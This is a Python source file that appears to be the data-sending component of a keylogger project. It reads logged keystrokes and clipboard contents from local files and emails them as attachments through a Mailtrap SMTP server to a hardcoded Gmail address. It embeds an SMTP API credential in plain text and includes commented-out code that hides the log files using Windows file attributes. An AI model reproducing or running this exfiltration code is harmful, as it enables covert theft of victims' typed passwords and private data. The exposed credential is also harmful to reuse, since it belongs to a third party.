
import smtplib
from email.message import EmailMessage
import os
import ctypes
# from keylogger import hide
# from keylogger import unhide 
from encryption import encryptContents 

log_file = "logs.txt"
clipBoard_file = "clipBoardLogs.txt"

# def unhide():
#     if os.path.exists(log_file):
#         print("unhidden")
#         os.system(f'attrib -h "{log_file}"')

#     if os.path.exists(clipBoard_file):
#         os.system(f'attrib -h "{clipBoard_file}"')

# def hide():
#     if os.path.exists(log_file):
#         os.system(f'attrib +h "{log_file}"')

#     if os.path.exists(clipBoard_file):
#         os.system(f'attrib +h "{clipBoard_file}"')


def sendEmail():
    print("sending")

    if os.path.exists("logs.txt"):
        print("here")
        # os.system(f'attrib -h "{"logs.txt"}"')
        # unhide()
    if os.path.exists("clipBoardLogs.txt"):
        print("here")
        # unhide()
        # os.system(f'attrib -h "{"clipBoardLogs.txt"}"')


    nlog_file = encryptContents("logs.txt")
    print(nlog_file)
    nclipBoard_file = encryptContents("clipBoardLogs.txt")
    print(nclipBoard_file)
    sender = "hello@demomailtrap.com"
    receiver = "ukharbanda20@gmail.com"
    
    message = EmailMessage()
    message["Subject"] = "Hi Mailtrap"
    message["From"] = sender
    message["To"] = receiver
    message.set_content("Please find the logs attached.")
    try:

        # if os.path.exists("logs.bin"):
        #     os.system(f'attrib -h "{"logs.bin"}"')
        # if os.path.exists("clipBoardLogs.bin"):
        #     os.system(f'attrib -h "{"clipBoardLogs.bin"}"')

        with open(log_file, "rb") as file:
            fileData = file.read()
            message.add_attachment(fileData, maintype="text", subtype="plain", filename="logs.txt")
        with open(clipBoard_file, "rb") as clipBoardFile:
            clipBoardFileData = clipBoardFile.read()
            message.add_attachment(clipBoardFileData, maintype="text", subtype="plain", filename="clipBoardLogs.txt")

        # if os.path.exists("logs.bin"):
        #     os.system(f'attrib +h "{"logs.bin"}"')
        # if os.path.exists("clipBoardLogs.bin"):
        #     os.system(f'attrib +h "{"clipBoardLogs.bin"}"')
        # hide()

        with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
            server.starttls()
            server.login("api", "c2151af737bd447f8f82331e58edbda8")
            server.send_message(message)
        print("Email sent successfully!")
    




    except smtplib.SMTPDataError as e:
        print("SMTP Data Error:", e)
    except smtplib.SMTPException as e:
        print("SMTP Error:", e)
    except Exception as e:
        print("General Error:", e)
    

if __name__ == "__main__":
    sendEmail()

    


